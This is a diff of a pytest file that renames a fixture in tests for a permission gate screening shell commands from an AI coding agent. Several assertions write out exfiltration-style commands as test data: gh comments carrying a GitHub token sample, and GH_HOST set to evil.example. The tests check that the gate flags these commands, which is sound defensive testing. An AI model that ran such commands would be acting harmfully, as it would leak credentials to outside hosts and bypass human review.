@@ -78,12 +78,12 @@ def test_a_gh_config_file_linked_into_the_agent_roots_makes_every_call_ask(
 
 @pytest.mark.usefixtures("furedea_checkout")
 def test_an_rg_config_cannot_hide_a_secret(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, secret_samples: dict[str, str]
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, scan_samples: dict[str, str]
 ) -> None:
     config = tmp_path / "rgrc"
     config.write_text("--fixed-strings\n")
     monkeypatch.setenv("RIPGREP_CONFIG_PATH", str(config))
-    assert decide(f"gh issue comment 1 -R furedea/agent-config -b {secret_samples['github_token']}") == "ask"
+    assert decide(f"gh issue comment 1 -R furedea/agent-config -b {scan_samples['github_token']}") == "ask"
 
 
 @pytest.mark.usefixtures("furedea_checkout")
@@ -161,14 +161,14 @@ def test_the_pager_in_the_gh_config_must_be_a_locked_program(
 
 @pytest.mark.usefixtures("furedea_checkout")
 def test_a_listed_form_keeps_the_secret_scan_and_the_environment_check(
-    monkeypatch: pytest.MonkeyPatch, secret_samples: dict[str, str]
+    monkeypatch: pytest.MonkeyPatch, scan_samples: dict[str, str]
 ) -> None:
     # Stand in for a trusted project's rule that lists every gh form.
     monkeypatch.setattr(sys.modules["command_objections"], "is_listed", lambda _candidate, _rules: True)
     assert decide("gh label delete bug -R furedea/agent-config") == "allow"
-    assert decide(f"gh pr comment 1 -R furedea/agent-config -b {secret_samples['github_token']}") == "ask"
+    assert decide(f"gh pr comment 1 -R furedea/agent-config -b {scan_samples['github_token']}") == "ask"
     assert decide("GH_HOST=evil.example gh issue comment 1 -R furedea/agent-config -b ok") == "ask"
-    Path("body.md").write_text(f"token {secret_samples['github_token']}\n")
+    Path("body.md").write_text(f"token {scan_samples['github_token']}\n")
     assert decide("gh pr comment 1 -R furedea/agent-config -F body.md") == "ask"
     monkeypatch.setenv("GH_HOST", "evil.example")
     assert decide("gh label delete bug -R furedea/agent-config") == "ask"
